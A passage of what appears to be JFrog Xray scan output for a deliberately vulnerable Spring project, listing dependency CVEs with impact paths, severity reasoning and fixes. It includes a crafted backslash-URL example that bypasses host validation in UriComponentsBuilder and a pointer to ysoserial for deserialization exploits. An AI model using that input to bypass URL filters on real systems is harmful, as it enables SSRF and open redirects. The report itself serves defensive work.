              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-125778",
        "references": [
          "https://github.com/spring-projects/spring-framework/issues/21680",
          "https://github.com/spring-projects/spring-framework/commit/2b051b8b321768a4cfef83077db65c6328ffd60f",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-579669626",
          "https://jira.spring.io/browse/SPR-17143?redirect=false",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-1231625331",
          "https://nvd.nist.gov/vuln/detail/CVE-2016-1000027",
          "https://raw.githubusercontent.com/distributedweaknessfiling/cvelist/master/2016/1000xxx/CVE-2016-1000027.json",
          "https://github.com/spring-projects/spring-framework/issues/24434",
          "https://github.com/spring-projects/spring-framework",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-744519525",
          "https://github.com/spring-projects/spring-framework/issues/24434#issuecomment-582313417",
          "https://support.contrastsecurity.com/hc/en-us/articles/4402400830612-Spring-web-Java-Deserialization-CVE-2016-1000027",
          "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-1000027",
          "https://github.com/spring-projects/spring-framework/commit/5cbe90b2cd91b866a5a9586e460f311860e11cfa",
          "https://security-tracker.debian.org/tracker/CVE-2016-1000027",
          "https://spring.io/blog/2022/05/11/spring-framework-5-3-20-and-5-2-22-available-now",
          "https://www.tenable.com/security/research/tra-2016-20",
          "https://security.netapp.com/advisory/ntap-20230420-0009",
          "https://security.netapp.com/advisory/ntap-20230420-0009/"
        ],
        "extended_information": {
          "short_description": "Unsafe deserialization in Spring RemoteInvocationSerializingExporter could lead to remote code execution.",
          "full_description": "Spring-based applications that export service beans as endpoints using classes that extend the [RemoteInvocationSerializingExporter](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.html) class are vulnerable to Java deserialization attacks which could lead to RCE (Remote Code Execution). As of 2016, this vulnerability is still not fixed, as the Pivotal team (the maintainers of the Spring framework) disputed it as a security vulnerability in Spring itself and decided not to issue a fix. Instead, they deprecated `HttpInvokerServiceExporter` and `SimpleHttpInvokerServiceExporter`, the potentially vulnerable exporter classes that extend `RemoteInvocationSerializingExporter` and warned application developers not to use them when exposed to untrusted user input (see \"WARNING\" in the [documentation](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html)). Applications that do not use the above classes can safely ignore this vulnerability.",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find a request that is handled by a class extending `RemoteInvocationSerializingExporter`",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "An RMI exploit can be generated by frameworks such as [ysoserial](https://github.com/frohoff/ysoserial/tree/master/src)"
            },
            {
              "name": "The issue has a detailed technical explanation published, that can aid in exploit development",
              "description": "The original advisory contains a technical writeup"
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote code execution"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nDo not use Java serialization for external endpoints (Do not extend the `RemoteInvocationSerializingExporter` class)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-22262",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
            "cwe": [
              "CWE-601",
              "CWE-918"
            ]
          }
        ],
        "summary": "Applications that use UriComponentsBuilder to parse an externally provided URL (e.g. through a query parameter) AND perform validation checks on the host of the parsed URL may be vulnerable to a open redirect attack or to a SSRF attack if the URL is used after passing validation checks.\n\nThis is the same as CVE-2024-22259 and CVE-2024-22243, but with different input.",
        "severity": "High",
        "components": {
          "gav://org.springframework:spring-web:5.3.31": {
            "fixed_versions": [
              "[5.3.34]",
              "[6.0.19]",
              "[6.1.6]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-598891",
        "references": [
          "https://github.com/advisories/GHSA-2wrp-6fg6-hmc5",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-22262",
          "https://spring.io/security/cve-2024-22262",
          "https://security.netapp.com/advisory/ntap-20240524-0003",
          "https://security.netapp.com/advisory/ntap-20240524-0003/",
          "https://github.com/spring-projects/spring-framework/blob/main/spring-web/src/main/java/org/springframework/web/util/UriComponentsBuilder.java"
        ],
        "extended_information": {
          "short_description": "Improper URI parsing in Spring Framework UriComponentsBuilder may lead to filter bypass when parsing crafted URLs.",
          "full_description": "The [Spring Framework](https://spring.io/) is a widely used Java-based application framework that provides infrastructure support for the development of enterprise-level Java applications.\nApplications that use `UriComponentsBuilder` in Spring Framework to parse an externally provided URL may be vulnerable to open redirect or SSRF attacks, if the application using the URL relies on validation checks to sanitize the URL before its use.\n\n`UriComponentsBuilder` is a utility class provided in the `org.springframework.web.util` package. It is used to construct URLs or URI components dynamically. This class is particularly useful when building URIs with dynamic parameters such as query parameters, path variables and fragments in web applications.\n\n`UriComponentsBuilder` class in `Spring` uses several regex patterns to parse and validate a given URL. A flaw in several patterns might lead to a filter bypass, which subsequently can lead to an open redirect attack or SSRF attack, depending on the usage of the URL.\nFor example:\n```\nUriComponents uriComponents = UriComponentsBuilder.fromUriString(\"http://google.com\\\\path\")\n                .path(\"/api/resource\")\n                .queryParam(\"param1\", \"value1\")\n                .build();\n        System.out.println(\"userinfo: \" + uriComponents.getUserInfo());\n        System.out.println(\"host: \" + uriComponents.getHost());\n```\n\nIn the vulnerable example above, the host that will be returned by `uriComponents.getHost()` is `google.com\\path`, although the expected host should be `google.com`. \n\nIt is important to note that a host that ends with a backslash (e. .g. `google.com\\`) will be interpreted differently on different applications. For example, Chrome will turn the backslash into a forward slash while other applications such as Curl will not be able to resolve the URL.\nThis means impact highly depends on the way the application will access the URL after it has been parsed by `UriComponentsBuilder`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The impact of exploiting the issue depends on the context of surrounding software. A severe impact such as RCE is not guaranteed.",
              "description": "The vulnerability's impact depends on how the URL is used after host validation. For example, if the URL is used to perform a POST request, then the impact would be SSRF, since the attacker would be able to send the POST request to an arbitrary host.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The vulnerable Spring application must validate a crafted URL using the `UriComponentsBuilder` class. In addition, the vulnerable Spring application must perform validations on the URL's host, in order for the vulnerability to have any security impact.",
              "is_positive": true
            },
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
              "description": "The attacker simply has to input a URL with the `\\\\` characters."
            }
          ]
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-38809",
            "cvss_v3_score": "5.3",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cwe": [
              "CWE-400",
              "CWE-1333"
            ]
          }
        ],
        "summary": "Applications that parse ETags from \"If-Match\" or \"If-None-Match\" request headers are vulnerable to DoS attack.\n\nUsers of affected versions should upgrade to the corresponding fixed version.\n\nUsers of older, unsupported versions could enforce a size limit on \"If-Match\" and \"If-None-Match\" headers, e.g. through a Filter.",
        "severity": "Medium",
        "components": {
          "gav://org.springframework:spring-web:5.3.31": {
            "fixed_versions": [
              "[5.3.38]",
              "[6.0.23]",
              "[6.1.12]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-security:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.security:spring-security-web:5.7.11"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework:spring-webmvc:5.3.31"
                },
                {
                  "component_id": "gav://org.springframework:spring-web:5.3.31"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-644055",
        "references": [
          "https://github.com/spring-projects/spring-framework/commit/582bfccbb72e5c8959a0b472d1dc7d03a20520f3",
          "https://github.com/advisories/GHSA-2rmj-mq67-h97g",
          "https://spring.io/security/cve-2024-38809",
          "https://github.com/spring-projects/spring-framework/commit/8d16a50907c11f7e6b407d878a26e84eba08a533",
          "https://github.com/spring-projects/spring-framework/commit/bb17ad8314b81850a939fd265fb53b3361705e85",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-38809",
          "https://github.com/spring-projects/spring-framework/issues/33372"
        ],
        "extended_information": {}
      },
      {
        "cves": [
          {
            "cve": "CVE-2023-35116",
            "cvss_v3_score": "4.7",
            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-770"
            ]
          }
        ],
        "summary": "jackson-databind through 2.15.2 allows attackers to cause a denial of service or other unspecified impact via a crafted object that uses cyclic dependencies. NOTE: the vendor's perspective is that this is not a valid vulnerability report, because the steps of constructing a cyclic data structure and trying to serialize it cannot be achieved by an external attacker.",
        "severity": "Medium",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.module:jackson-module-parameter-names:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.dataformat:jackson-dataformat-yaml:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson:jackson-bom:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.module:jackson-module-parameter-names:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-ui:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-webmvc-core:1.8.0"
                },
                {
                  "component_id": "gav://org.springdoc:springdoc-openapi-common:1.8.0"
                },
                {
                  "component_id": "gav://io.swagger.core.v3:swagger-core:2.2.20"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jdk8:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ],
              [
                {
                  "component_id": "gav://unspecified:JavaSpringVulny:unspecified"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-web:2.7.18"
                },
                {
                  "component_id": "gav://org.springframework.boot:spring-boot-starter-json:2.7.18"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.module:jackson-module-parameter-names:2.13.5"
                },
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.13.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-522015",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2023-35116",
          "https://github.com/FasterXML/jackson-databind/issues/3972"
        ],
        "extended_information": {
          "short_description": "(Non-Issue) Excessive recursion in Jackson-databind leads to denial of service when serializing untrusted Java objects.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "is_positive": true
            },
            {
              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
              "description": "The CVSS does not reflect the fact that the vulnerability was disputed.",
              "is_positive": true
            },
            {
              "name": "The issue has been disputed by the vendor",
              "description": "The vulnerable object cannot be serialized through Jackson APIs, making it extremely unlikely that such an object will be deserialized in a real-world scenario",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "A public crashing PoC was published."
            }
          ]
        }
      }
    ],
    "component_id": "root",
    "package_type": "generic",
    "status": "completed"
  }
]
